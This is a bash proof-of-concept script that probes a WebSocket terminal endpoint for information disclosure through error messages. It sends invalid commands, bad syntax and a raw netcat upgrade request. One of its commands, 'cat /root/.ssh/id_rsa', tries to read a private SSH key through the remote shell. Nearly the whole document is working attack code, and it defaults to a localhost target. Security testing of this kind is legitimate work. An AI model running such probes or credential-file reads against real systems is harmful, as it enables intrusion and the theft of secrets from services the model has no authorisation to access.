#!/bin/bash

# POC: WebSocket Error Message Information Disclosure
# This script demonstrates how error messages from the WebSocket terminal
# endpoint reveal system environment information without proper sanitization

TARGET="${1:-ws://localhost:8080/ws}"
TIMEOUT=5

echo "[*] WebSocket Error Message Information Disclosure POC"
echo "[*] Target: $TARGET"
echo ""

# Function to send WebSocket message and capture response
send_websocket_command() {
    local cmd="$1"
    echo "[*] Testing command: $cmd"
    
    # Use websocat or wscat if available, fallback to curl with simple approach
    if command -v websocat &> /dev/null; then
        echo "$cmd" | timeout $TIMEOUT websocat "$TARGET" 2>&1
    elif command -v wscat &> /dev/null; then
        (sleep 0.5; echo "$cmd"; sleep 1) | timeout $TIMEOUT wscat -c "$TARGET" 2>&1
    else
        # Fallback: Use curl to establish WebSocket connection if available
        timeout $TIMEOUT curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
            -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
            -H "Sec-WebSocket-Version: 13" \
            "$TARGET" 2>&1 || echo "[!] Could not connect - testing manual approach"
    fi
    echo ""
}

# Test 1: Invalid command that reveals shell environment
echo "[*] Test 1: Invalid command to trigger error messages"
echo "----"
send_websocket_command "invalidcmd12345"

# Test 2: Command with invalid option to reveal command help/path
echo "[*] Test 2: Valid command with invalid argument to reveal usage information"
echo "----"
send_websocket_command "ls --invalid-option-xyz"

# Test 3: Access restricted file to trigger permission error with path info
echo "[*] Test 3: Attempt to access restricted file to reveal file paths in error"
echo "----"
send_websocket_command "cat /root/.ssh/id_rsa"

# Test 4: Search for non-existent binary
echo "[*] Test 4: Non-existent command to reveal PATH and shell environment"
echo "----"
send_websocket_command "nonexistent_binary_xyz"

# Test 5: Syntax error to reveal shell type and error formatting
echo "[*] Test 5: Bash syntax error to reveal shell details"
echo "----"
send_websocket_command "if [ -f /etc/passwd"

# Alternative direct test using netcat if available
echo "[*] Test 6: Direct WebSocket connection with netcat (if available)"
echo "----"
if command -v nc &> /dev/null || command -v ncat &> /dev/null; then
    # Attempt direct connection
    {
        # WebSocket upgrade request
        echo "GET /ws HTTP/1.1"
        echo "Host: localhost:8080"
        echo "Upgrade: websocket"
        echo "Connection: Upgrade"
        echo "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ=="
        echo "Sec-WebSocket-Version: 13"
        echo ""
        sleep 1
        echo "badcommand999"
        sleep 2
    } | timeout $TIMEOUT nc localhost 8080 2>&1 || true
fi

echo "[+] POC Complete - Check for information disclosure in error messages"
echo "[+] Look for:"
echo "    - Command not found messages revealing shell type"
echo "    - File paths in error messages"
echo "    - System environment details"
echo "    - Installed application versions"
echo "    - Permission denied messages revealing file structure"